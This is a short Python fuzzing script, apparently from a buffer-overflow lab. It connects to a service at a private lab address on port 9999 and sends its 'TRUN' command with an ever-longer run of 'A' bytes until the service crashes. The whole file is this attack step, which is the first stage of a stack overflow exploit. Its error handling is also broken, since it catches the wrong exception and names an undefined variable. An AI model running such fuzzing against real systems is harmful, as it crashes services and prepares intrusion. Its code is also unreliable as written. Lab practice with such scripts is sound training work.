#!/usr/bin/python 

import socket,sys
from time import sleep

address = '192.168.136.130'
port    = 9999

offset  = 100

while True:
	try:
		buffer  = b""         # empty byte var
		buffer += b"A"*offset # junk times offset
		print(f'[+] Sending buffer: {str(len(buffer))} bytes')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((address,port))
		s.recv(1024)			
		s.send(b"TRUN /.:/%s \r\n" % buffer) 
		offset += 100
		sleep(1)
	except RuntimeError as Err:
		print(f'[!] Unable to connect to the application. {err}')
		sys.exit(0)
	finally:
		s.close()